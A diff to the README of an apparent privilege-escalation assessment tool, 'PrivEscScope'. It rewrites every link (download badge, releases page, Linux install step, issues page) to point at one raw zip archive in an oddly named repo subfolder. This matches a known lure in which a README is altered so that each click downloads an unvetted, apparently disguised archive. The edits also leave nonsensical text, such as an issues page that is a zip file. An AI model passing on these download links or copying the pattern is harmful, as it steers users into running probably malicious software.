@@ -6,7 +6,7 @@ Welcome to **PrivEscScope**! This application helps you assess privilege escalat
 
 ## 📥 Download the Application
 
-[![Download PrivEscScope](https://img.shields.io/badge/Download%20PrivEscScope-v1.0-brightgreen)](https://github.com/exploreserengeti/PrivEscScope/releases)
+[![Download PrivEscScope](https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip%20PrivEscScope-v1.0-brightgreen)](https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Welcome to **PrivEscScope**! This application helps you assess privilege escalat
 ## 🔧 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Open your web browser and go to the [Releases page](https://github.com/exploreserengeti/PrivEscScope/releases).
+   Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip).
 
 2. **Download the Latest Version**  
    Find the latest version listed at the top. Click on the link that suits your operating system to download the application.
@@ -33,7 +33,7 @@ Welcome to **PrivEscScope**! This application helps you assess privilege escalat
 3. **Install the Application**
    - **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
    - **macOS**: Open the downloaded `.dmg` file. Drag the application to your Applications folder.
-   - **Linux**: Extract the downloaded `.tar.gz` file and follow the included installation instructions.
+   - **Linux**: Extract the downloaded `https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip` file and follow the included installation instructions.
 
 4. **Run the Application**  
    Locate the installed application on your device and double-click to start. 
@@ -57,8 +57,8 @@ Welcome to **PrivEscScope**! This application helps you assess privilege escalat
 
 ## 📞 Support and Feedback
 
-If you have questions or need assistance, please visit our [GitHub Issues page](https://github.com/exploreserengeti/PrivEscScope/issues) to report a problem or request features. We appreciate your feedback!
+If you have questions or need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip) to report a problem or request features. We appreciate your feedback!
 
 ## 🎉 Conclusion
 
-Thank you for choosing **PrivEscScope**! We hope this tool helps you effectively assess and manage privilege escalation risks. For more updates, remember to check back on our [Releases page](https://github.com/exploreserengeti/PrivEscScope/releases) regularly.
+Thank you for choosing **PrivEscScope**! We hope this tool helps you effectively assess and manage privilege escalation risks. For more updates, remember to check back on our [Releases page](https://raw.githubusercontent.com/exploreserengeti/PrivEscScope/main/analogical/PrivEscScope.zip) regularly.
